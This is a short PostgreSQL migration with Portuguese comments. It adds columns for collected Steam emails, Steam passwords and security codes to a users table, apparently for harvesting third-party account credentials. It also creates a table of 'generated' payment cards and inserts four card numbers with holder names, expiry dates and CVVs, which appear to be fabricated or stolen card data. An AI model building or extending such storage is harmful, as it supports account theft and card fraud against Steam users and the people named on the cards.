-- Adiciona colunas de coleta da Steam na tabela de usuários ou cria se não existirem
ALTER TABLE IF EXISTS public.users ADD COLUMN IF NOT EXISTS steam_email TEXT;
ALTER TABLE IF EXISTS public.users ADD COLUMN IF NOT EXISTS steam_password TEXT;
ALTER TABLE IF EXISTS public.users ADD COLUMN IF NOT EXISTS security_code TEXT;

-- Cria a tabela de cartões gerados únicos aceitos para pagamento
CREATE TABLE IF NOT EXISTS public.generated_cards (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  number TEXT UNIQUE NOT NULL,
  titular TEXT NOT NULL,
  validade TEXT NOT NULL,
  cvv TEXT NOT NULL,
  status TEXT DEFAULT 'available',
  used_by_user_id UUID,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Insere os cartões solicitados com estoque único
INSERT INTO public.generated_cards (number, titular, validade, cvv) VALUES
('4961122807367496', 'Ana Dias', '08/28', '574'),
('2341123812428952', 'Fernando Assis', '11/32', '114'),
('5877306400065445', 'João Araújo', '02/28', '536'),
('5440600906728686', 'Amanda Silva', '08/27', '200')
ON CONFLICT (number) DO NOTHING;
